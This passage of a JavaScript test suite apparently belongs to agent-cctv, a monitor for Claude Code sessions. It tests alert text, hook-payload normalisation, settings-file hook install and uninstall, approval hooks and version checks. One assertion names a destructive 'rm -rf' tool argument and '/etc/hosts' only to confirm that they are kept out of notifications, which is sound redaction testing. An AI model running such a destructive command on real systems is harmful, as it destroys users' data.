  assert.match(shown, /agent-cctv/, 'which session');
  assert.match(shown, /permission prompt/, 'and why it stopped');
  assert.ok(!shown.includes('rm -rf'), 'the tool argument stays off the notification');
  assert.ok(!shown.includes('/etc/hosts'), "the agent's own words stay off it too");
  assert.equal(a.tag, 'cctv:abc', 'tagged per session, so a flapping session replaces itself');
});

test('an alert still identifies a session with no name or project', () => {
  const a = describeAlert({ id: 'a1e14137-c327-44ae-b019-3049d7237909', urgent: true });
  assert.match(a.title, /^a1e14137 needs you$/);
  assert.equal(a.body, 'needs you');
});

/* ── hooks (optional path) ─────────────────────────────────────────────── */

test('hook payloads normalize to the same event shape', () => {
  const u = fromHook({
    source: 'claude-code',
    receivedAt: 1000,
    payload: {
      session_id: 'abc',
      hook_event_name: 'PreToolUse',
      cwd: '/tmp/proj',
      tool_name: 'Bash',
      tool_input: { command: 'make' },
    },
  });
  assert.equal(u.sessionId, 'abc');
  assert.equal(u.events[0].kind, 'tool_start');
  assert.equal(u.events[0].detail, 'make');
  assert.equal(u.patch.cwd, '/tmp/proj');
});

test('unknown or malformed hook payloads are dropped, not thrown', () => {
  assert.equal(fromHook({}), null);
  assert.equal(fromHook({ payload: {} }), null);
  assert.equal(fromHook({ payload: { session_id: 'a', hook_event_name: 'Nope' } }), null);
});

/* ── settings install ──────────────────────────────────────────────────── */

test('install adds hooks, is idempotent, and uninstall leaves the file as found', () => {
  const dir = tmpdir('settings');
  const file = path.join(dir, 'settings.json');
  const original = {
    theme: 'dark',
    hooks: {
      PreToolUse: [{ matcher: '*', hooks: [{ type: 'command', command: 'echo mine' }] }],
    },
  };
  fs.writeFileSync(file, JSON.stringify(original, null, 2));

  installer.install({ file });
  installer.install({ file }); // twice must not duplicate

  const after = JSON.parse(fs.readFileSync(file, 'utf8'));
  const pre = after.hooks.PreToolUse.flatMap((g) => g.hooks);
  assert.equal(pre.filter((h) => h.command.includes('hook.js')).length, 1, 'no duplicate entries');
  assert.ok(pre.some((h) => h.command === 'echo mine'), "the user's own hook survives");
  assert.equal(after.theme, 'dark', 'unrelated settings are untouched');

  const r = installer.uninstall({ file });
  assert.equal(r.removed, 9);
  const restored = JSON.parse(fs.readFileSync(file, 'utf8'));
  assert.deepEqual(restored, original, 'uninstall restores the original exactly');
});

test('install refuses to touch a settings file it cannot parse', () => {
  const dir = tmpdir('bad');
  const file = path.join(dir, 'settings.json');
  fs.writeFileSync(file, '{ this is not json');
  assert.throws(() => installer.install({ file }), /Cannot parse/);
  assert.equal(fs.readFileSync(file, 'utf8'), '{ this is not json', 'file left alone');
});

test('a missing settings file is created rather than erroring', () => {
  const dir = tmpdir('new');
  const file = path.join(dir, 'settings.json');
  installer.install({ file });
  assert.ok(JSON.parse(fs.readFileSync(file, 'utf8')).hooks.SessionStart);
});

test('installApprovals writes one PermissionRequest entry with its own timeout', () => {
  const dir = tmpdir('approvals-install');
  const file = path.join(dir, 'settings.json');
  installer.installApprovals({ file });
  installer.installApprovals({ file }); // twice must not duplicate
  const settings = JSON.parse(fs.readFileSync(file, 'utf8'));
  const groups = settings.hooks.PermissionRequest;
  assert.equal(groups.length, 1);
  assert.equal(groups[0].matcher, '*');
  assert.equal(groups[0].hooks.length, 1);
  assert.equal(groups[0].hooks[0].timeout, 300, 'the 5s enrichment timeout must not leak in');
  assert.match(groups[0].hooks[0].command, /approve-hook\.js/);
  assert.equal(installer.approvalsInstalled({ file }), true);
  assert.equal(installer.status({ file }).approvals, true);

  // Plain install() must not add it, and uninstall() must remove it.
  const plain = path.join(dir, 'plain.json');
  installer.install({ file: plain });
  assert.equal(installer.approvalsInstalled({ file: plain }), false);
  installer.uninstall({ file });
  assert.equal(installer.approvalsInstalled({ file }), false);
  assert.equal(
    JSON.parse(fs.readFileSync(file, 'utf8')).hooks?.PermissionRequest,
    undefined,
    'the emptied group must not linger'
  );
});

test('claudeVersionOk enforces the spike-verified floor', () => {
  assert.equal(installer.MIN_CLAUDE_VERSION, '2.1.226');
  assert.equal(installer.claudeVersionOk('2.1.226 (Claude Code)'), true);
  assert.equal(installer.claudeVersionOk('2.1.227'), true);
  assert.equal(installer.claudeVersionOk('2.2.0'), true);
  assert.equal(installer.claudeVersionOk('3.0.0'), true);
  assert.equal(installer.claudeVersionOk('2.1.225'), false);
  assert.equal(installer.claudeVersionOk('2.0.999'), false);
  assert.equal(installer.claudeVersionOk('1.9.9'), false);
  assert.equal(installer.claudeVersionOk(''), false);
  assert.equal(installer.claudeVersionOk(null), false);
  assert.equal(installer.claudeVersionOk('no digits here'), false);
});

test('capabilities() reports whether the approvals hook is installed', async () => {
  const { capabilities } = await import('../src/sources/claude-code/index.js');
  assert.equal(typeof capabilities().approvals, 'boolean');
});

/* ── misc ──────────────────────────────────────────────────────────────── */

test('project slug matches how Claude Code names transcript directories', () => {
  assert.equal(projectSlug('/Users/me/PV/fun/agent-cctv'), '-Users-me-PV-fun-agent-cctv');
  assert.equal(projectSlug('/Users/me/.planchette'), '-Users-me--planchette');
  assert.equal(projectSlug('/Users/me/Term 2/AI'), '-Users-me-Term-2-AI');
});
